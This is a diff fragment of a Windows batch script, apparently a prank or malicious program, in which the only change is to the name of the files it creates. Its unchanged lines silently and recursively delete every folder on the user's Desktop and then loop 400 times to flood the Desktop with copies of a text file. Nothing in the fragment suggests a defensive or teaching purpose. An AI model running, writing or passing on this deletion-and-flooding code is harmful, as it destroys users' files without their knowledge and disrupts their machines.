@@ -11,7 +11,7 @@ SET /a cr=0
 for /d %%p in (%userprofile%\Desktop\*) Do rd /Q /S "%%p"
 
 :l
-copy %temp%\text.txt "%userprofile%\Desktop\Hung To Hung To Hung To Hung To Hung To Hung To Hung To %cr%X.txt"
+copy %temp%\text.txt "%userprofile%\Desktop\Hung To Hung To Hung To Hung To Hung To Hung To Hung To %cr%.txt"
 SET /a cr=%cr%+1
 if not %cr%==400 goto l
 
